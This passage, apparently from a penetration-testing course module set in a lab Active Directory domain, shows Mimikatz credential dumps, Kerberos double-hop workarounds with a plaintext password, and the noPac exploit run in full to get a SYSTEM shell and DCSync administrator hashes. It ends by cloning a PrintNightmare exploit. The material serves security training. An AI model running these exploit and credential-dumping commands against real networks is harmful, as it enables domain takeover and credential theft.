         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70647 (00000000:000113f7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :

Authentication Id : 0 ; 996 (00000000:000003e4)
User Name         : DEV01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
```

There are indeed processes running in the context of the `backupadm` user, such as `wsmprovhost.exe`, which is the process that spawns when a Windows Remote PowerShell session is spawned.

​                                                                                                        Kerberos "Double Hop" Problem                      

```powershell-session
[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm
                             0:00:03 N/A
tasklist.exe                  6532 Services                   0      7,988 K Unknown         INLANEFREIGHT\backupadm
                             0:00:00 N/A
conhost.exe                   7048 Services                   0     12,656 K Unknown         INLANEFREIGHT\backupadm
                             0:00:00 N/A
```

In the simplest terms, in this situation, when we try to issue a  multi-server command, our credentials will not be sent from the first  machine to the second.

Let's say we have three hosts:  `Attack host` --> `DEV01` --> `DC01`. Our Attack Host is a Parrot box within the corporate network but not  joined to the domain. We obtain a set of credentials for a domain user  and find that they are part of the `Remote Management Users` group on DEV01. We want to use `PowerView` to enumerate the domain, which requires communication with the Domain Controller, DC01.

![image](https://academy.hackthebox.com/storage/modules/143/double_hop.png)

When we connect to `DEV01` using a tool such as `evil-winrm`, we connect with network authentication, so our credentials are not  stored in memory and, therefore, will not be present on the system to  authenticate to other resources on behalf of our user. When we load a  tool such as `PowerView` and attempt to query Active  Directory, Kerberos has no way of telling the DC that our user can  access resources in the domain. This happens because the user's Kerberos TGT (Ticket Granting Ticket) ticket is not sent to the remote session;  therefore, the user has no way to prove their identity, and commands  will no longer be run in this user's context. In other words, when  authenticating to the target host, the user's ticket-granting service  (TGS) ticket is sent to the remote service, which allows command  execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be  present in the request, so the remote service will have no way to prove  that the authentication attempt is valid, and we will be denied access  to the remote service.

If unconstrained delegation is enabled on a server, it is likely we  won't face the "Double Hop" problem. In this scenario, when a user sends their TGS ticket to access the target server, their TGT ticket will be  sent along with the request. The target server now has the user's TGT  ticket in memory and can use it to request a TGS ticket on their behalf  on the next host they are attempting to access. In other words, the  account's TGT ticket is cached, which has the ability to sign TGS  tickets and grant remote access. Generally speaking, if you land on a  box with unconstrained delegation, you already won and aren't worrying  about this anyways.

------

### Workarounds

A few workarounds for the double-hop issue are covered in [this post](https://posts.slayerlabs.com/double-hop/). We can use a "nested" `Invoke-Command` to send credentials (after creating a PSCredential object) with every  request, so if we try to authenticate from our attack host to host A and run commands on host B, we are permitted. We'll cover two methods in  this section: the first being one that we can use if we are working with an `evil-winrm` session and the second if we have GUI access to a Windows host (either an attack host in the network or a  domain-joined host we have compromised.)

------

### Workaround #1: PSCredential Object

We can also connect to the remote host via host A and set up a  PSCredential object to pass our credentials again. Let's see that in  action.

After connecting to a remote host with domain credentials, we import  PowerView and then try to run a command. As seen below, we get an error  because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

If we check with `klist`, we see that we only have a cached Kerberos ticket for our current server.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

So now, let's set up a PSCredential object and try again. First, we set up our authentication.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

Now we can try to query the SPN accounts using PowerView and are  successful because we passed our credentials along with the command.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```shell-session
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

If we try again without specifying the `-credential` flag, we once again get an error message.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```shell-session
get-domainuser -spn | select 

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname 

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

If we RDP to the same host, open a CMD prompt, and type `klist`, we'll see that we have the necessary tickets cached to interact  directly with the Domain Controller, and we don't need to worry about  the double hop problem. This is because our password is stored in  memory, so it can be sent along with every request we make.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```cmd-session
C:\htb> klist

Current LogonId is 0:0x1e5b8b

Cached Tickets: (4)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#1>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#2>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: ProtectedStorage/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#3>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: cifs/DC01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

------

### Workaround #2: Register PSSession Configuration

We've seen what we can do to overcome this problem when using a tool such as `evil-winrm` to connect to a host via WinRM. What if we're on a domain-joined host  and can connect remotely to another using WinRM? Or we are working from a Windows attack host and connect to our target via WinRM using the [Enter-PSSession cmdlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2)? Here we have another option to change our setup to be able to interact  directly with the DC or other hosts/resources without having to set up a PSCredential object and include credentials along with every command  (which may not be an option with some tools).

Let's start by first establishing a WinRM session on the remote host.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```powershell-session
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm
```

If we check for cached tickets using `klist`, we'll see  that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for  accessing the HTTP service on the target since we connected over WinRM,  which uses SOAP (Simple Object Access Protocol) requests in XML format  to communicate over HTTP, so it makes sense.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```powershell-session
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x11e387

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
       Start Time: 6/28/2022 9:09:19 (local)
       End Time:   6/28/2022 19:09:19 (local)
       Renew Time: 0
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x8 -> ASC
       Kdc Called:
```

We also cannot interact directly with the DC using PowerView

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```powershell-session
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
   + FullyQualifiedErrorId : DirectoryServicesCOMException
```

One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```powershell-session
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

 WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
 a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
 required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.

   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

Type            Keys                                Name
----            ----                                ----
Container       {Name=backupadmsess}                backupadmsess
```

Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new  PSSession using the named registered session we set up previously.

After we start the session, we can see that the double hop problem has been eliminated, and if we type `klist`, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote  machine in the context of the `backupadm` user and all requests from our local machine will be sent directly to the Domain Controller.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```powershell-session
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x2239ba

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       Start Time: 6/28/2022 13:24:37 (local)
       End Time:   6/28/2022 23:24:37 (local)
       Renew Time: 7/5/2022 13:24:37 (local)
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x1 -> PRIMARY
       Kdc Called: DC01
```

We can now run tools such as PowerView without having to create a new PSCredential object.

​                                                                                                        **Kerberos "Double Hop" Problem**                      

```powershell-session
[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the  credentials popup. Furthermore, if we try to run this by first setting  up a PSCredential object and then attempting to run the command by  passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not  work via an evil-winrm session as it requires GUI access and a proper  PowerShell console. Furthermore, in our testing, we could not get this  method to work from PowerShell on a Parrot or Ubuntu attack host due to  certain limitations on how PowerShell on Linux works with Kerberos  credentials. This method is still highly effective if we are testing  from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to mount  further attacks against hosts in the environment. .

We can also use other methods such as CredSSP, port forwarding, or  injecting into a process running in the context of a target user  (sacrificial process) that we won't cover here.

------

### Wrap Up

In this section, we've seen how to overcome the Kerberos "Double Hop" problem when working with WinRM in an AD environment. We will encounter this often during our assessments, so we must understand the issue and  have certain tactics in our toolbox to avoid losing time.

The following section will cover other ways to escalate privileges  and move laterally in a domain once we have valid credentials using  various critical vulnerabilities identified throughout 2021.

## Bleeding Edge Vulnerabilities

When it comes to patch management and cycles, many organizations are  not quick to roll out patches through their networks. Because of this,  we may be able to achieve a quick win either for initial access or  domain privilege escalation using a very recent tactic. At the time of  writing (April 2022), the three techniques shown in this section are  relatively recent (within the last 6-9 months). These are advanced  topics that can not be covered thoroughly in one module section. The  purpose of demonstrating these attacks is to allow students to try out  the latest and greatest attacks in a controlled lab environment and  present topics that will be covered in extreme depth in more advanced  Active Directory modules. As with any attack, if you do not understand  how these work or the risk they could pose to a production environment,  it would be best not to attempt them during a real-world client  engagement. That being said, these techniques could be considered "safe" and less destructive than attacks such as [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/). Still, we should always exercise caution, take detailed notes, and  communicate with our clients. All attacks come with a risk. For example, the `PrintNightmare` attack could potentially crash the print spooler service on a remote host and cause a service disruption.

As information security practitioners in a rapidly changing and  evolving field, we must keep ourselves sharp and on top of recent  attacks and new tools and techniques. We recommend trying out all of the techniques in this section and doing additional research to find other  methods for performing these attacks. Now, let's dive in.

------

### Scenario Setup

In this section, we will perform all examples from a Linux attack  host. You can spawn the hosts for this section at the end of this  section and SSH into the ATTACK01 Linux attack host. For the portion of  this section that demonstrates interaction from a Windows host (using  Rubeus and Mimikatz), you could spawn the MS01 attack host in the  previous or next section and use the base64 certificate blob obtained  using `ntlmrelayx.py` and `petitpotam.py` to perform the same pass-the-ticket attack using Rubeus as demonstrated near the end of this section.

------

### NoPac (SamAccountName Spoofing)

A great example of an emerging threat is the [Sam_The_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing` released at the end of 2021. This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a  quick breakdown of what each CVE provides regarding this vulnerability.

| 42278                                                        | 42287                                                        |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `42278` is a bypass vulnerability with the Security Account Manager (SAM). | `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS. |

This exploit path takes advantage of being able to change the `SamAccountName` of a computer account to that of a Domain Controller. By default, authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain  Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of  the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service  and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).

We can use this [tool](https://github.com/Ridter/noPac) to perform this attack. This tool is present on the ATTACK01 host in `/opt/noPac`.

NoPac uses many tools in Impacket to communicate with, upload a  payload, and issue commands from the attack host to the target DC.  Before attempting to use the exploit, we should ensure Impacket is  installed and the noPac exploit repo is cloned to our attack host if  needed. We can use these commands to do so:

#### Ensuring Impacket is Installed

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git
```

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ python setup.py install 
```

#### Cloning the NoPac Exploit Repo

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ git clone https://github.com/Ridter/noPac.git
```

Once Impacket is installed and we ensure the repo is cloned to our  attack box, we can use the scripts in the NoPac directory to check if  the system is vulnerable using a scanner (`scanner.py`) then use the exploit (`noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt  to obtain a TGT from the target Domain Controller. If successful, this  indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to 10. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. If this is the case, the attack will fail because our user  will not have the rights to add a new machine account. Setting this to `0` can prevent quite a few AD attacks.

#### Scanning for NoPac

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
```

There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this  by running noPac.py with the syntax below to impersonate the built-in  administrator account and drop into a semi-interactive shell session on  the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

#### Running NoPac & Getting a Shell

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                               
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
[*] Saving ticket in ACADEMY-EA-DC01.ccache
[*] Resting the machine account to WIN-LWJFQMAXRVN$
[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating administrator
[*] 	Requesting S4U2self
[*] Saving ticket in administrator.ccache
[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Rename ccache with target ...
[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$
[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

We will notice that a `semi-interactive shell session` is established with the target using [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.

It is important to note that NoPac.py does save the TGT in the  directory on the attack host where the exploit was run. We can use `ls` to confirm.

#### Confirming the Location of Saved Tickets

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py
```

We could then use the ccache file to perform a pass-the-ticket and  perform further attacks such as DCSync. We can also use the tool with  the `-dump` flag to perform a DCSync using secretsdump.py.  This method would still create a ccache file on disk, which we would  want to be aware of and clean up.

#### Using noPac to DCSync the Built-in Administrator Account

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                                                    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] will try to impersonat administrator
[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

------

### Windows Defender & SMBEXEC.py Considerations

If Windows Defender (or another AV or EDR product) is enabled on a  target, our shell session may be established, but issuing any commands  will likely fail. The first thing smbexec.py does is create a service  called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a .bat file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the  system. Let's look at a Windows Defender log to see what behavior was  considered malicious.

#### Windows Defender Quarantine Log

![image](https://academy.hackthebox.com/storage/modules/143/defenderLog.png)

If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. The focus of  this module is on tactics and techniques. We will refine our methodology as we progress in more advanced modules, but we first must obtain a  solid base in enumerating and attacking Active Directory.

------

### PrintNightmare

`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems. Many exploits have been  written based on these vulnerabilities that allow for privilege  escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module, but is also important to practice within the context of Active  Directory environments for gaining remote access to a host. Let's  practice with one exploit that can allow us to gain a SYSTEM shell  session on a Domain Controller running on a Windows Server 2019 host.

Before conducting this attack, we must retrieve the exploit we will use. In this case, we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit. We can use Git to clone it to our attack host:

#### Cloning the Exploit

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ git clone https://github.com/cube0x0/CVE-2021-1675.git
```

